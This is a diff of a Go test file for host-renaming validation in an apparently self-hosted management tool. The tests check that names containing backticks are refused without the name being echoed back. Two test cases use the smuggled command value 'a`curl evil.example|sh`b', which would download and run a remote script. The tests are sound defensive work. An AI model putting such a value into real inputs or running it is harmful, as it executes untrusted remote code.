@@ -5,6 +5,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/eyupio/zoomies/internal/naming"
 	"github.com/eyupio/zoomies/internal/store"
 )
 
@@ -52,8 +53,9 @@ func TestAHostCannotBeRenamedToAnotherHostsName(t *testing.T) {
 	for name, body := range map[string]string{
 		"taken":      "taken",
 		"empty":      "   ",
-		"too long":   strings.Repeat("a", maxHostNameLength+1),
+		"too long":   strings.Repeat("a", naming.MaxHostNameLength+1),
 		"line break": "two\nlines",
+		"backticks":  "a`curl evil.example|sh`b",
 	} {
 		res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
 			cookie: h.session(operator), body: map[string]any{"name": body}})
@@ -67,4 +69,31 @@ func TestAHostCannotBeRenamedToAnotherHostsName(t *testing.T) {
 	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
 		cookie: h.session(operator), body: map[string]any{"name": "vm-2"}}).
 		mustStatus(t, http.StatusOK, "keep the same name")
+}
+
+// An agent chooses its name at join, and an operator may change it afterwards;
+// the two doors share one rule, so a name the join refuses cannot be put on a
+// host by renaming it. The refusal says what is wrong without repeating the
+// name, because it is the text nobody has vouched for.
+func TestARenameThatCouldPassForACommandIsRefusedAndSaysWhy(t *testing.T) {
+	h := newHarness(t)
+	host := h.host("vm-2")
+	operator, _ := h.user("operator", store.RoleOperator)
+
+	res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
+		cookie: h.session(operator), body: map[string]any{"name": "a`curl evil.example|sh`b"}})
+	res.mustStatus(t, http.StatusUnprocessableEntity, "rename to a name with backticks")
+	if body := string(res.body); !strings.Contains(body, "backtick") || strings.Contains(body, "evil.example") {
+		t.Errorf("the refusal should name the rule and not repeat the name: %s", body)
+	}
+	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "vm-2" {
+		t.Fatalf("name = %q after a refused rename, want it unchanged", stored.Name)
+	}
+
+	// A host already stored under such a name can be given a good one: the
+	// rule is about the name being set, not the one being replaced.
+	legacy := h.host("old`name")
+	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + legacy.ID,
+		cookie: h.session(operator), body: map[string]any{"name": "tidy-name"}}).
+		mustStatus(t, http.StatusOK, "rename a host out of a name that is now refused")
 }
